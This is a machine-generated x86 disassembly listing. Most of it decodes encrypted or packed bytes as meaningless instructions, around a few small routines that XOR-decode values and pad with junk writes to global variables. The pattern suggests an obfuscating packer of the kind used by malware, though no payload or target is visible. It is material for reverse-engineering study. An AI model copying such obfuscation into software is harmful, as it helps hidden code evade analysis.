  408231:	imul   eax,DWORD PTR [esi+0x40e996f9],0x6b
  408238:	(bad)  
  408239:	xchg   edx,eax
  40823a:	stos   DWORD PTR es:[edi],eax
  40823b:	pop    ebx
  40823c:	adc    BYTE PTR [ebp+0x79],ch
  40823f:	sub    eax,0x3c9bb16e
  408244:	dec    esp
  408245:	sub    al,0x6e
  408247:	add    ah,BYTE PTR gs:[esi]
  40824a:	psubd  mm7,QWORD PTR [ebx]
  40824d:	sar    BYTE PTR [ebx],0x7f
  408250:	pop    ebx
  408251:	loop   0x40824f
  408253:	jns    0x408206
  408255:	fst    st(6)
  408257:	mov    cl,0x32
  408259:	mov    DWORD PTR [edi-0x76],ebp
  40825c:	out    dx,eax
  40825d:	fld    QWORD PTR [esi]
  40825f:	xchg   esp,eax
  408260:	pop    ss
  408261:	jg     0x4082db
  408263:	inc    eax
  408264:	xchg   ebx,eax
  408265:	pop    esi
  408266:	outs   dx,DWORD PTR ds:[esi]
  408267:	inc    edx
  408268:	aas    
  408269:	scas   eax,DWORD PTR es:[edi]
  40826a:	jg     0x4082af
  40826c:	call   0x1cc6:0x88a5abac
  408273:	fiadd  DWORD PTR [eax+0x76]
  408276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408277:	into   
  408278:	jmp    0x90a2:0x63eab4e0
  40827f:	jne    0x40827b
  408281:	jnp    0x4082cc
  408283:	ds std 
  408285:	push   edx
  408286:	mov    BYTE PTR [esi-0x26e95fc],0x4
  40828d:	iret   
  40828e:	sar    edx,cl
  408290:	ins    BYTE PTR es:[edi],dx
  408291:	pop    ecx
  408292:	mov    BYTE PTR [esi],dl
  408294:	scas   eax,DWORD PTR es:[edi]
  408295:	pop    esi
  408296:	push   ds
  408297:	lahf   
  408298:	push   ebp
  408299:	push   0xffffff86
  40829b:	cmp    DWORD PTR [edi+0x2a23c670],0x3c7f8187
  4082a5:	popf   
  4082a6:	jae    0x408276
  4082a8:	mov    ebx,0x50a20d18
  4082ad:	push   edi
  4082ae:	lods   eax,DWORD PTR ds:[esi]
  4082af:	mov    al,ds:0xd3542f35
  4082b4:	mov    ah,0x83
  4082b6:	mov    ss,ecx
  4082b8:	jmp    0xe3bfcd72
  4082bd:	test   al,0x5d
  4082bf:	fstp   QWORD PTR [edx]
  4082c1:	fwait
  4082c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082c3:	pushf  
  4082c4:	mov    edx,0xc2dcfe65
  4082c9:	lahf   
  4082ca:	test   al,0x81
  4082cc:	nop
  4082cd:	mov    edx,0x9a86b61e
  4082d2:	add    eax,0x4d7f7032
  4082d7:	stc    
  4082d8:	jns    0x40834c
  4082da:	sbb    BYTE PTR [ebx+0x25],0x66
  4082de:	jmp    0xf777:0x540c058c
  4082e5:	fucomi st,st(5)
  4082e7:	clc    
  4082e8:	sbb    eax,0xd0838eea
  4082ed:	mov    al,0x9b
  4082ef:	mov    DWORD PTR [eax+edi*4],edi
  4082f2:	popa   
  4082f3:	xor    ah,BYTE PTR [esi+0x7a7a8476]
  4082f9:	jmp    DWORD PTR [edi+0x6488151]
  4082ff:	inc    eax
  408300:	add    DWORD PTR [esi-0x72b5a311],ebx
  408306:	add    al,0xed
  408308:	mov    edi,DWORD PTR [ebp-0x43baf08a]
  40830e:	ja     0x4082cf
  408310:	pop    esp
  408311:	push   es
  408312:	test   eax,0xf0604b63
  408317:	out    dx,al
  408318:	jge    0x4082b3
  40831a:	(bad)  
  40831c:	jns    0x4082bd
  40831e:	addr16 test eax,0x1692a017
  408324:	cld    
  408325:	lods   al,BYTE PTR ds:[esi]
  408326:	pusha  
  408327:	repnz xor ch,cl
  40832a:	sub    al,0xf2
  40832c:	lea    eax,[eax+edx*1+0x32729d]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e772
  408366:	adc    DWORD PTR ds:0x42e762,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x430542,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e76e,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e76e
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x4304a6,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43048a
  4083aa:	or     DWORD PTR ds:0x42ee0c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ee10,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43048e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e766,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43049a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e776,0x42e76e
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e76e,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43048e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43048e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43048e,esi
  408424:	cmp    DWORD PTR ds:0x43048e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42ea08
  40844d:	cmp    DWORD PTR ds:0x43048e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	in     eax,dx
  40847e:	out    dx,eax
  40847f:	cmp    al,0x29
  408481:	popa   
  408482:	fdivr  QWORD PTR [esi+0x7e]
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x408470
  40848a:	mov    ds:0x3f72ff77,al
  40848f:	fisubr DWORD PTR [edi]
  408491:	lea    edi,[eax-0x24cd603b]
  408497:	test   eax,0xfb4e564e
  40849c:	xchg   ecx,eax
  40849d:	cs loop 0x408427
  4084a0:	push   ebx
  4084a1:	jae    0x40843d
  4084a3:	out    0x69,eax
  4084a5:	das    
  4084a6:	mov    eax,edx
  4084a8:	scas   eax,DWORD PTR es:[edi]
  4084a9:	add    cl,dh
  4084ab:	retf   0xeb4e
  4084ae:	inc    eax
  4084af:	sti    
  4084b0:	inc    edi
  4084b1:	jmp    0x87ce947a
  4084b6:	rcr    DWORD PTR [eax-0x393c5956],0x32
  4084bd:	mov    esp,0x82f204b2
  4084c2:	mov    ds,WORD PTR [edi-0x65b3d012]
  4084c8:	mov    ah,0x98
  4084ca:	sti    
  4084cb:	lea    eax,[ecx+0x4f34a9ef]
  4084d1:	dec    ebx
  4084d2:	mov    ?,ebp
  4084d4:	dec    edx
  4084d5:	mov    esp,0xcbead859
  4084da:	jg     0x408524
  4084dc:	xchg   ecx,eax
  4084dd:	or     eax,0x9d820041
  4084e2:	push   ss
  4084e3:	push   edi
  4084e4:	push   cs
  4084e5:	and    DWORD PTR [ebp+0x40],esp
  4084e8:	jmp    0x2ae6:0x5c58ad48
  4084ef:	or     ebp,DWORD PTR [edx+0x45]
  4084f2:	jmp    0x83aa565f
  4084f7:	popa   
  4084f8:	js     0x40850d
  4084fa:	jge    0x408541
  4084fc:	push   ecx
  4084fd:	outs   dx,DWORD PTR ds:[esi]
  4084fe:	rcr    DWORD PTR [esi-0x2],1
  408501:	add    ebp,DWORD PTR [edi-0x1e450f36]
  408507:	xor    eax,0x78a7aeef
  40850c:	imul   DWORD PTR [ecx-0x16ed08c7]
  408512:	mov    dh,BYTE PTR [esi-0x7e]
  408515:	gs test eax,0xd1de4603
  40851b:	jle    0x408563
  40851d:	test   eax,0x9f4a9ef6
  408522:	lods   eax,DWORD PTR ds:[esi]
  408523:	out    0xb9,eax
  408525:	scas   al,BYTE PTR es:[edi]
  408526:	test   DWORD PTR [edi+ebp*1-0x1c],edi
  40852a:	mov    al,0x3e
  40852c:	mul    DWORD PTR [ecx+0x61]
  40852f:	cmp    BYTE PTR [edx+ecx*8-0x5f],dl
  408533:	xchg   DWORD PTR ds:0xc8b3e092,eax
  408539:	mov    esp,0x3f020db3
  40853e:	(bad)  
  40853f:	out    dx,al
  408540:	leave  
  408541:	lds    ebp,FWORD PTR ds:0x2a999271
  408547:	push   eax
  408548:	ss scas eax,DWORD PTR es:[edi]
  40854a:	xchg   esi,eax
  40854b:	rcl    BYTE PTR [eiz*4+0x388d71e1],1
  408552:	sub    DWORD PTR [ecx-0x9596a4e],edi
  408558:	(bad)  
  408559:	bswap  edx
  40855b:	jno    0x4085b4
  40855d:	xlat   BYTE PTR ds:[ebx]
  40855e:	push   esp
  40855f:	and    BYTE PTR [ebp+0x32],bh
  408562:	aaa    
  408563:	fwait
  408564:	or     BYTE PTR [edx-0x7c],dh
  408567:	adc    esi,DWORD PTR fs:[edi]
  40856a:	lock sub DWORD PTR [ebp-0x7c6e0702],eax
  408571:	sbb    al,dl
  408573:	sbb    al,BYTE PTR [ebp+0x6fde8037]
  408579:	call   0xf0bce168
  40857e:	lds    ebp,FWORD PTR [edx-0x12]
  408581:	out    dx,al
  408582:	mov    eax,eax
  408584:	jo     0x4085cf
  408586:	or     eax,ecx
  408588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408589:	daa    
  40858a:	mov    WORD PTR [ebx],ds
  40858c:	inc    edx
  40858d:	and    BYTE PTR [ecx-0xcff7ba2],al
  408593:	call   0x587a:0x6066531
  40859a:	adc    al,0x2
  40859c:	cdq    
  40859d:	scas   eax,DWORD PTR es:[edi]
  40859e:	pusha  
  40859f:	xchg   edx,eax
  4085a0:	or     DWORD PTR [ebp-0x60fb8927],edi
  4085a6:	imul   ecx,DWORD PTR [ebp-0x494b7046],0xc48c4d26
  4085b0:	out    dx,eax
  4085b1:	inc    ebp
  4085b2:	dec    esi
  4085b3:	popf   
  4085b4:	sub    BYTE PTR [ebp-0x8],ch
  4085b7:	scas   al,BYTE PTR es:[edi]
  4085b8:	push   edi
  4085b9:	mov    ?,WORD PTR [ecx]
  4085bb:	push   0x5d
  4085bd:	sbb    eax,0x88b5f228
  4085c2:	push   0x58
  4085c4:	sub    DWORD PTR [edx+edx*1-0x4c],esp
  4085c8:	push   edx
  4085c9:	ss inc ebp
  4085cb:	retf   
  4085cc:	sbb    BYTE PTR [ecx+eiz*8+0x3],bh
  4085d0:	mov    edx,0xe08ffbb5
  4085d5:	scas   al,BYTE PTR es:[edi]
  4085d6:	sbb    dh,bl
  4085d8:	(bad)  
  4085d9:	ins    BYTE PTR es:[edi],dx
  4085da:	xor    ecx,DWORD PTR [esi]
  4085dc:	push   cs
  4085dd:	adc    al,0x33
  4085df:	aam    0x98
  4085e1:	jbe    0x408617
  4085e3:	jnp    0x4085f8
  4085e5:	or     BYTE PTR [edi-0x36],cl
  4085e8:	sti    
  4085e9:	pushf  
  4085ea:	mov    ebx,0x458c6335
  4085ef:	retf   0xe27f
  4085f2:	arpl   WORD PTR [ecx-0x5e],bx
  4085f5:	cld    
  4085f6:	lds    eax,FWORD PTR [ecx]
  4085f8:	adc    BYTE PTR [ebx+edi*4+0x711af5d6],dl
  4085ff:	jl     0x40867e
  408601:	jecxz  0x408665
  408603:	mov    DWORD PTR [eax+0x42db79c6],0x7796d5b4
  40860d:	jmp    0x1e7183f8
  408612:	push   ss
  408613:	mov    al,ds:0xd9f68fb8
  408618:	pop    esp
  408619:	scas   al,BYTE PTR es:[edi]
  40861a:	das    
  40861b:	iret   
  40861c:	mov    edx,0xdbd77b54
  408621:	mov    ds:0x46a643b1,al
  408626:	mov    esi,0x570bd58f
  40862b:	mov    edx,0xb95b24dd
  408630:	loop   0x408627
  408632:	adc    DWORD PTR [ebx-0x31b0d332],eax
  408638:	cli    
  408639:	ins    BYTE PTR es:[edi],dx
  40863a:	lea    ebx,[edx+0x34]
  40863d:	int3   
  40863e:	iret   
  40863f:	mov    edi,0x1a0fd450
  408644:	les    edx,FWORD PTR [ecx+edi*2+0x5c]
  408648:	pop    ss
  408649:	mov    cl,0x4e
  40864b:	mov    ch,0xd9
  40864d:	inc    esi
  40864e:	sbb    BYTE PTR [ebx+ebx*2-0x8c1fde5],dh
  408655:	(bad)  
  408656:	jb     0x4086b0
  408658:	je     0x408664
  40865a:	push   ecx
  40865b:	jmp    0x520d:0xe42a4800
  408662:	in     al,0x38
  408664:	push   0x52
  408666:	arpl   WORD PTR [ebp-0x30],cx
  408669:	adc    BYTE PTR [esi],cl
  40866b:	ins    BYTE PTR es:[edi],dx
  40866c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40866d:	push   0xf5dab6db
  408672:	test   al,0x29
  408674:	pop    esi
  408675:	mov    esi,0x72517ee
  40867a:	mov    ah,0xb2
  40867c:	cdq    
  40867d:	mov    ebx,0x3a8e61b0
  408682:	fimul  DWORD PTR [edi]
  408684:	inc    ecx
  408685:	xchg   edx,eax
  408686:	into   
  408687:	(bad)  
  408688:	pop    ds
  408689:	mov    ds:0x34d9d1f5,eax
  40868e:	lds    edx,FWORD PTR [ebp-0x42]
  408691:	mov    al,ds:0x8fa8eb3b
  408696:	loop   0x4086ac
  408698:	jne    0x4086b9
  40869a:	pop    ecx
  40869b:	xor    eax,0x2d3a6547
  4086a0:	jb     0x40871e
  4086a2:	call   0xc387:0x362ad4b3
  4086a9:	jb     0x4086ea
  4086ab:	adc    BYTE PTR [ebp+0x2cc090f5],dh
  4086b1:	mov    esp,0x10837522
  4086b6:	mov    ebp,esi
  4086b8:	cmp    BYTE PTR [ebp+0x5b34e7c1],ah
  4086be:	push   ss
  4086bf:	jne    0x4086ec
  4086c1:	sbb    ebp,edx
  4086c3:	and    eax,0x3d0aba55
  4086c8:	sub    esp,0x5503a0d5
  4086ce:	popf   
  4086cf:	ja     0x40866e
  4086d1:	(bad)  
  4086d2:	dec    esp
  4086d3:	cmp    bl,al
  4086d5:	loope  0x408735
  4086d7:	aam    0x6b
  4086d9:	test   BYTE PTR [esi+0x7bee1c],bl
  4086df:	sbb    BYTE PTR [edi],cl
  4086e1:	dec    edi
  4086e2:	and    BYTE PTR [edi],0x65
  4086e5:	fwait
  4086e6:	mov    esp,0x6b0a1e4e
  4086eb:	ins    DWORD PTR es:[edi],dx
  4086ec:	shl    BYTE PTR [edx-0x7c381427],0x1e
  4086f3:	jp     0x4086ee
  4086f5:	fs inc ebx
  4086f7:	or     al,0xc9
  4086f9:	mov    ds:0xd946a7ab,al
  4086fe:	retf   0x2963
  408701:	inc    ebp
  408702:	push   es
  408703:	push   ss
  408704:	clc    
  408705:	xchg   edi,eax
  408706:	arpl   di,dx
  408708:	test   DWORD PTR [edi-0x1f94d38a],0x62213608
  408712:	lea    eax,[ebp-0x6d]
  408715:	sar    bh,0xa9
  408718:	aam    0x24
  40871a:	mov    ebp,0x8ed2a54e
  40871f:	wrmsr  
  408721:	mov    bh,0xcc
  408723:	dec    eax
  408724:	mov    dl,0xb3
  408726:	push   ss
  408727:	adc    dh,BYTE PTR [ebx]
  408729:	and    al,BYTE PTR [ebp+0x5258fd68]
  40872f:	test   eax,0x83c180cb
  408734:	test   ch,bl
  408736:	shl    DWORD PTR [edx+0x222d1e16],cl
  40873c:	sbb    DWORD PTR [ecx+eiz*2-0x10c06cd6],edx
  408743:	ror    BYTE PTR [eax],0x4e
  408746:	rol    ebx,cl
  408748:	sbb    edx,esi
  40874a:	or     al,0xfa
  40874c:	dec    esi
  40874d:	inc    edi
  40874e:	add    eax,0xf0f612ac
  408753:	jb     0x4087bc
  408755:	inc    esp
  408756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408757:	jg     0x4087b5
  408759:	aas    
  40875a:	pop    edi
  40875b:	jle    0x408733
  40875d:	dec    eax
  40875e:	aad    0x66
  408760:	(bad)
  408764:	jmp    0x4087b3
  408766:	lock push ebp
  408768:	or     DWORD PTR [esi-0x462dcc1d],esi
  40876e:	lods   eax,DWORD PTR ds:[esi]
  40876f:	cld    
  408770:	fs jb  0x40876a
  408773:	icebp  
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  edx,QWORD PTR [edx+0x7d]
  40878c:	add    BYTE PTR [ebx+0x7e7edf43],al
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x408764
  408797:	xchg   edx,eax
  408798:	in     eax,dx
  408799:	mov    eax,0xe37dd95c
  40879e:	pop    eax
  40879f:	stos   BYTE PTR es:[edi],al
  4087a0:	sbb    eax,0x69eeff99
  4087a5:	loopne 0x408780
  4087a7:	call   0xe399323d
  4087ac:	add    eax,0x7c0c025f
  4087b1:	fsubr  QWORD PTR [ebp-0x4c]
  4087b4:	mov    bh,0xf2
  4087b6:	dec    eax
  4087b7:	xchg   esp,eax
  4087b8:	mov    ebp,0xe8c71137
  4087bd:	jecxz  0x4087b8
  4087bf:	sbb    ebx,esp
  4087c1:	push   DWORD PTR [edi+0x1c6b5a06]
  4087c7:	mov    ah,0x1
  4087c9:	shl    BYTE PTR [edi],cl
  4087cb:	pop    ds
  4087cc:	fwait
  4087cd:	call   0x28db:0xf84884d1
  4087d4:	xor    DWORD PTR [edx+edx*2],0x8e1499e2
  4087db:	fdiv   st(4),st
  4087dd:	cmc    
  4087de:	add    DWORD PTR [edi],edi
  4087e0:	(bad)  
  4087e1:	pop    ecx
  4087e2:	test   BYTE PTR [eax-0x2e],ah
  4087e5:	ds fs clc 
  4087e8:	or     DWORD PTR [eax],edx
  4087ea:	scas   al,BYTE PTR es:[edi]
  4087eb:	mov    ss,WORD PTR [edi]
  4087ed:	loop   0x40876f
  4087ef:	xor    edx,DWORD PTR [ebp+0x2b]
  4087f2:	fcmovne st,st(0)
  4087f4:	or     al,0xa4
  4087f7:	int    0x16
  4087f9:	lock or al,0xd0
  4087fc:	push   ecx
  4087fd:	inc    edi
  4087fe:	rcl    DWORD PTR [esi],1
  408800:	fs aad 0xb
  408803:	(bad)  
  408804:	(bad)  
  408805:	cmp    ah,cl
  408807:	mov    eax,0xef7f12f2
  40880c:	cmp    BYTE PTR fs:[edx],dl
  40880f:	push   ecx
  408810:	out    dx,eax
  408811:	xchg   esp,eax
  408812:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  408814:	inc    ecx
  408815:	cli    
  408816:	fistp  DWORD PTR [eax+0x28b10006]
  40881c:	pop    edi
  40881d:	popf   
  40881e:	mov    edx,0xb501486c
  408823:	scas   eax,DWORD PTR es:[edi]
  408824:	or     al,0xa8
  408826:	cmp    eax,0x8af8751
  40882b:	(bad)  
  40882c:	sbb    ecx,ecx
  40882e:	jae    0x40881a
  408830:	or     BYTE PTR [ebx],al
  408832:	pop    eax
  408833:	pop    ds
  408834:	outs   dx,DWORD PTR ds:[esi]
  408835:	mov    edx,0x5345814e
  40883a:	mov    eax,ds:0x70d01693
  40883f:	fild   DWORD PTR ds:0x377470e6
  408845:	jbe    0x4088b2
  408847:	ret    0x6b01
  40884a:	mov    ds:0x84b15996,al
  40884f:	and    eax,0xfd41ed0e
  408854:	div    BYTE PTR [ecx-0x67e624cd]
  40885a:	in     eax,0x2b
  40885c:	inc    edx
  40885d:	dec    ebp
  40885e:	dec    edi
  40885f:	hlt    
  408860:	dec    ebx
  408861:	adc    esi,DWORD PTR [esi+0x77]
  408864:	fisttp WORD PTR ds:0xf0f4b2b2
  40886a:	jp     0x408868
  40886c:	js     0x40882c
  40886e:	leave  
  40886f:	xchg   esp,eax
  408870:	jbe    0x4087ff
  408872:	icebp  
  408873:	ins    DWORD PTR es:[edi],dx
  408874:	mov    ah,0xf5
  408876:	sbb    eax,0xe7de5213
  40887b:	jbe    0x4088cf
  40887d:	mov    edx,0x54da6a1d
  408882:	mov    esp,ebp
  408884:	lods   al,BYTE PTR ds:[esi]
  408885:	or     ebp,DWORD PTR [edi-0x5672ef89]
  40888b:	jp     0x40885c
  40888d:	jmp    0xa99d:0xf05933ac
  408894:	push   ebp
  408895:	mov    dl,al
  408897:	ja     0x4088ab
  408899:	fidivr DWORD PTR [ecx-0x46bef520]
  40889f:	xchg   edx,eax
  4088a0:	jl     0x408904
  4088a2:	pop    esp
  4088a3:	push   cs
  4088a4:	push   ebp
  4088a5:	mov    al,ds:0x408cfc76
  4088aa:	push   edi
  4088ab:	cmp    al,0xe9
  4088ad:	fsubr  DWORD PTR [ebp+eax*2-0x39dae03d]
  4088b4:	mov    ss,ebx
  4088b6:	cmp    DWORD PTR [edx+0x4f],esp
  4088b9:	sbb    eax,0x7687fc40
  4088be:	pop    edx
  4088bf:	cmp    ebp,DWORD PTR [esi+ebx*1+0x327b1d3e]
  4088c6:	mov    cl,0x9d
  4088c8:	dec    edi
  4088c9:	jns    0x408940
  4088cb:	(bad)  
  4088cc:	fist   DWORD PTR [ecx]
  4088ce:	push   esp
  4088cf:	out    dx,al
  4088d0:	inc    esi
  4088d1:	imul   ebx,DWORD PTR [edx],0x59
  4088d4:	sbb    DWORD PTR [eax-0x5b64af8c],edi
  4088da:	outs   dx,DWORD PTR ds:[esi]
  4088db:	mov    DWORD PTR [edi+0x51283628],ebx
  4088e1:	xchg   ebx,eax
  4088e2:	out    0x36,al
  4088e4:	push   cs
  4088e5:	out    0x48,al
  4088e7:	cli    
  4088e8:	pop    ecx
  4088e9:	adc    eax,0xdea13d3c
  4088ee:	jno    0x408878
  4088f0:	pop    esp
  4088f1:	ja     0x4088d7
  4088f3:	(bad)  
  4088f4:	popf   
  4088f5:	adc    BYTE PTR [ebx-0x69024920],ah
  4088fb:	and    edi,ecx
  4088fd:	xor    DWORD PTR ds:0x1d72ad46,0xffffffb5
  408904:	push   ebx
  408905:	ret    
  408906:	jge    0x408923
  408908:	mov    ch,0x47
  40890a:	mov    ah,0x21
  40890c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40890d:	daa    
  40890e:	jns    0x40894e
  408910:	icebp  
  408911:	or     DWORD PTR [ecx],esi
  408913:	popa   
  408914:	loop   0x4088e6
  408916:	inc    ecx
  408917:	addr16 jb 0x408937
  40891a:	ds ins DWORD PTR es:[edi],dx
  40891c:	jmp    0x92b69c92
  408921:	loope  0x4088bb
  408923:	sbb    DWORD PTR ss:[edx+0x67],ebx
  408927:	jo     0x4088ec
  408929:	mov    bh,0x52
  40892b:	or     esi,0x50379a8a
  408931:	pushf  
  408932:	mov    ecx,esp
  408934:	adc    DWORD PTR ds:0x7c66251f,edx
  40893a:	sbb    al,0xd0
  40893c:	push   ebx
  40893d:	push   ds
  40893e:	lock in eax,0xb6
  408941:	mov    es,esp
  408943:	pop    ss
  408944:	cmp    al,0x68
  408946:	jo     0x4088da
  408948:	mov    esi,0x94bb3212
  40894d:	xchg   ebx,eax
  40894e:	mov    ss,esi
  408950:	cld    
  408951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408952:	jp     0x408940
  408954:	fstp   DWORD PTR [esi]
  408956:	pop    edi
  408957:	test   al,0x7f
  408959:	int    0xec
  40895b:	aas    
  40895c:	xor    BYTE PTR [edx],dh
  40895e:	and    ch,BYTE PTR [edx]
  408960:	out    dx,al
  408961:	out    dx,al
  408962:	loope  0x408974
  408964:	xor    edi,eax
  408966:	ficom  DWORD PTR [esi+0x6c]
  408969:	or     ecx,DWORD PTR [edi]
  40896b:	and    bl,BYTE PTR [eax+0x79]
  40896e:	mov    ds:0xc271308a,al
  408973:	pop    ebp
  408974:	enter  0x482c,0x7b
  408978:	icebp  
  408979:	cmp    BYTE PTR [edx-0x251a0ebf],cl
  40897f:	lock retf 
  408981:	xor    eax,0x13dd56bf
  408986:	add    BYTE PTR [esi+0x4],ch
  408989:	mov    edi,0x25fb06e7
  40898e:	dec    edi
  40898f:	mov    fs,WORD PTR [ebx+ebx*4+0x24]
  408993:	out    0x37,al
  408995:	and    BYTE PTR [ecx+0x5f],ah
  408998:	and    ah,BYTE PTR [ebx+0x3f]
  40899b:	loope  0x4089f1
  40899d:	in     al,0xb1
  40899f:	jo     0x4089a6
  4089a1:	push   0xffffff89
  4089a3:	ss jno 0x40899a
  4089a6:	or     al,0xe8
  4089a8:	das    
  4089a9:	or     eax,0x2c615fbc
  4089ae:	mov    ebp,0x6b94f653
  4089b3:	mov    al,ds:0x50346df7
  4089b8:	das    
  4089b9:	sbb    DWORD PTR [eax+0x422c2dbd],edi
  4089bf:	or     BYTE PTR [edi],ah
  4089c1:	or     dl,BYTE PTR [ecx]
  4089c3:	mov    BYTE PTR ds:0xfdf16c2b,al
  4089c9:	xchg   esi,eax
  4089ca:	jge    0x40898b
  4089cc:	sub    al,0x24
  4089ce:	push   ecx
  4089cf:	cmp    dh,ch
  4089d1:	xchg   edi,eax
  4089d2:	xchg   esp,eax
  4089d3:	or     eax,0x52a3c6c9
  4089d8:	xor    DWORD PTR [eax+0x6274fdb6],0xffffffe8
  4089df:	jge    0x4089db
  4089e1:	mov    ecx,0xc8e0360f
  4089e6:	stc    
  4089e7:	loopne 0x4089db
  4089e9:	out    dx,al
  4089ea:	int    0xba
  4089ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089ed:	push   ebx
  4089ee:	repnz sbb BYTE PTR [esi+ebx*1-0x6f],al
  4089f3:	mov    al,BYTE PTR [ebp-0xb8acf4d]
  4089f9:	jmp    0xda37:0x70fd09cc
  408a00:	sub    DWORD PTR [ebx],ecx
  408a02:	ins    BYTE PTR es:[edi],dx
  408a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a05:	mov    cl,0xf1
  408a07:	test   BYTE PTR ss:[esp+eax*8+0x604a6218],0x43
  408a10:	xchg   edi,eax
  408a11:	(bad)  
  408a12:	pushf  
  408a13:	pop    es
  408a14:	in     al,dx
  408a15:	xchg   esp,eax
  408a16:	jp     0x408a26
  408a18:	and    esp,ebx
  408a1a:	pop    ebp
  408a1b:	sub    esi,ebx
  408a1d:	bound  esp,QWORD PTR [ecx-0x6a]
  408a20:	pop    edi
  408a21:	pop    esp
  408a22:	pop    esi
  408a23:	hlt    
  408a24:	enter  0xa2e3,0xa2
  408a28:	out    dx,al
  408a29:	xchg   DWORD PTR [esi+0x4344c933],edi
  408a2f:	and    ebx,DWORD PTR [edx+0x44]
  408a32:	stos   BYTE PTR es:[edi],al
  408a33:	mov    eax,0x2989379a
  408a38:	xchg   edi,eax
  408a39:	jbe    0x4089dc
  408a3b:	ret    
  408a3c:	cmp    bl,BYTE PTR [edx]
  408a3e:	sbb    eax,0xbea0dd6b
  408a43:	pop    edi
  408a44:	outs   dx,DWORD PTR ds:[esi]
  408a45:	jle    0x4089eb
  408a47:	es ret 
  408a49:	xor    edi,edi
  408a4b:	gs aaa 
  408a4d:	shl    DWORD PTR [ebp-0x23783df9],cl
  408a53:	loop   0x408a6c
  408a55:	rol    edi,cl
  408a57:	div    eax
  408a59:	jno    0x408a55
  408a5b:	cdq    
  408a5c:	pop    esp
  408a5d:	inc    edx
  408a5e:	gs sbb eax,0xa0a86e26
  408a64:	loop   0x408abb
  408a66:	shl    BYTE PTR [edi],1
  408a68:	mov    ds:0x37b52f2c,eax
  408a6d:	sub    eax,0xa941ca12
  408a72:	mov    edi,0x983e7598
  408a77:	imul   eax,DWORD PTR [ecx+0x161d8fc9],0xffffff81
  408a7e:	mov    eax,ecx
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e76a,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e76a,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e76a,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430496
  408ab1:	push   0x42ee30
